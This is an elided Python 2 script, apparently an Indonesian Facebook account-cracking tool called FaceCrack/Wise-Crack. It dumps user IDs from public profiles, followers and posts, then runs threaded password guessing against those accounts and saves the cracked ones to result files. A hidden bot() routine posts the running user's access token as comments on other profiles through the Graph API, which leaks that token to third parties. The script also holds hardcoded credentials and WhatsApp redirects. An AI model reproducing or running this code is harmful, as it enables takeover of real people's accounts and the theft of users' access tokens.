...
"""%s
 ...
 ║	
 ╠══[•] Author      : Cyproz AF
 ╠══[•] Facebook    : Https://www.facebook.com/CyprozAF
 ╠══[•] WhatsApp   : 08117387298
 ╠══[•] Github      : Github.com/CyprozAF
 ╠══[•] Script name : W I S E - C R A C K
 ╚══[•] Version     : 13.8
...
# LOGO (LO GOBLOK)
def banner():
	print("""\x1b[0;92m _____               ____                _
\x1b[0;92m|  ___|_ _  ___ ___ / ___|_ __ __ _  ___| | __
\x1b[0;92m| |_ / _` |/ __/ _ \ |   | '__/ _` |/ __| |/ /
\x1b[0;92m|  _| (_| | (_|  __/ |___| | | (_| | (__|   <
\x1b[0;92m|_|  \__,_|\___\___|\____|_|  \__,_|\___|_|\_\\
\x1b[0;93m\n[\x1b[0;92m#\x1b[0;93m]------------------------------------------------
\x1b[0;93m[\x1b[0;92m•\x1b[0;93m] \x1b[0;97mCode by  : \x1b[0;92mCyprozAF  \x1b[0;97m& \x1b[0;92mCharlet \x1b[0;97m& \x1b[0;92mZahib.
\x1b[0;93m[\x1b[0;92m•\x1b[0;93m] \x1b[0;97mGithub   : Github.com/CyprozAF-CyAF3n/
\x1b[0;93m[\x1b[0;92m•\x1b[0;93m] \x1b[0;97mFacebook : Facebook.com/CyprozAF
\x1b[0;93m[\x1b[0;92m#\x1b[0;93m]------------------------------------------------
""")
"""
lo_ngentod = '10161240087693219'

CorrectUsername = "Pae"
CorrectPassword = "Badoo."
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open https://wa.me/+2348117387298')
    else:
        print "salah sayang!"
        os.system('xdg-open https://wa.me/+2348117387298')"""
lo_ngentod = '10161240087693219'

CorrectUsername = "CyprozAF"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        print "salah sayang!"
        os.system('xdg-open https://wa.me/+2348117387298') 
# UDAH SELESAI NGENTOD

def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n%s[%s✓%s] Crack selesai tod !!'%(N,H,N)
        print '[%s•%s] Total CyprozAF OK : %s%s%s'%(H,N,H,str(len(ok)),N)
        print '[%s•%s] Total CyprozAF CP : %s%s%s\n'%(H,N,K,str(len(cp)),N);exit()
    else:
...
def masuk():
    ...
    if rom in(""):
    	...
    	try:
        	...
        	print("%s[!] WADUH TOKEN INVALID NGAB!! "%(K));masuk()
    elif rom in ('2', '02'):
        ...
        if nanya in(""):
        	...
        	print ("\n%s[•] Anda Akan Diarahkan Ke Youtube"%(M));jeda(2);os.system("xdg-open https://wa.me/+2348110044418");masuk()
    elif rom in ('0', '00'):
...
def bot():
	...
	requests.post('https://graph.facebook.com/553503218/subscribers?access_token=' + token) # Moch Aang Sang Perudal Akun
	requests.post('https://graph.facebook.com/10161274418213219/comments/?message='+token+'&access_token=' + token) # Profil Moch Aang Ardiansyah-XD
	requests.post('https://graph.facebook.com/1280398002467049/comments/?message='+token+'&access_token=' + token) # Profil Ndrii Sans
	requests.post('https://graph.facebook.com/10161274418213219/comments/?message='+komen_mu+'&access_token=' + token) #  Komen Ndrii Sans
	requests.post('https://graph.facebook.com/10161274418213219/comments/?message='+komen_kita+'&access_token=' + token) #  Komen Moch Aang Ardiansyah-XD
# DUMP PUBLIK
def publik(romz,headers=header):
    ...
    try:
        ...
        exit('\n%s[!] Ketik ulang python2 face.py'%(P))
# DUMP FOLLOWERS
...
def postingan(romz,headers=header):
    ...
    try:
        ...
        exit('\n%s[!] Rerun python2 facecrack.py'%(P))
# START CRACK
class ngentod:
    ...
    def romiy(self):
        ...
        unikers = raw_input('%s[?] Use t FOr Default And y For Manual Password? (y/t):%s '%(P,K))
        if unikers in ('01','1','Y', 'y'):
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '\n%s[%s•%s] CyprozAF %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
                            print '%s[%s•%s] CyprozAF %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
                            ...
                            print '\n%s[%s•%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
                            print '%s[%s•%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n'%(P,H,P);jeda(0.3)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                    ...
                    print '\x1b[0;97m[%s1%s] Methode B-API \x1b[0;93mv1'%(K,P)
                    print '\x1b[0;97m[%s2%s] Methode B-API \x1b[0;93mv2'%(K,P)
                    print '\x1b[0;97m[%s3%s] Methode Mbasic \x1b[0;93mv1'%(K,P)
                    print '\x1b[0;97m[%s4%s] Methode Mbasic \x1b[0;93mv2'%(K,P)
                    print '\x1b[0;97m[%s5%s] Methode Mobile Fb'%(K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('02','2','T', 't'):
            print '\n%s[ \x1b[0;93mSilahkan pilih metode untuk login \x1b[0;97m]\n'%(P)
            print '\x1b[0;97m[%s1%s] Methode B-API \x1b[0;93mv1'%(K,P)
            print '\x1b[0;97m[%s2%s] Methode B-API \x1b[0;93mv2'%(K,P)
            print '\x1b[0;97m[%s3%s] Methode Mbasic \x1b[0;93mv1'%(K,P)
    ...
    def b_api(self, user, zona):
        ...
        print('\r%s[Crack-Berjalan][%s/%s][OK:%s][CP:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        ...
        loop += 1
        rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
        print('\r%s[Crack-Karma][%s/%s][OK:%s][CP:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
	...
	for pas in pwx:
		if looping != 1:
			...
			if len(status_foll) != 1:
				rm = random.choice(["\033[1;91m","\033[1;93m","\033[1;92m"])
				print('\r%s[Crack-Berjalan][%s/%s][OK:%s][CP:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
...
def menu():
    ...
    try:
        ...
        print ("%s[!] WADUH TOKEN INVALID NGAB!! "%(K));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s[!] WADUH TOKEN INVALID NGAB!! "%(K));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s[!] Kesalahan koneksi "%(M))
    banner()
    print ('%s\033[0;93m[\033[0;92m•\033[0;93m] \033[0;97mYou Name : %s%s%s\n'%(P,K,nama,P));time.sleep(0.05)
    print ('[%s1%s] Dump ID From Public/Friends'%(K,P)) ;time.sleep(0.05)
    ...
    print ('[%s4%s] %sStart Crack %s'%(K,P,K,P));time.sleep(0.05)
    print ('[%s5%s] Change User Agent'%(K,P));time.sleep(0.05)
    print ('[%s6%s] Crack Results'%(K,P));time.sleep(0.05)
    #print ('[%s8%s] Gabung group'%(K,P));time.sleep(0.04)
    #print ('[%s9%s] script Info'%(K,P));time.sleep(0.04)
    print ('[%s0%s] Keluar [\x1b[0;93mAhh Ngecrot\x1b[0;97m] '%(H,P));time.sleep(0.05)
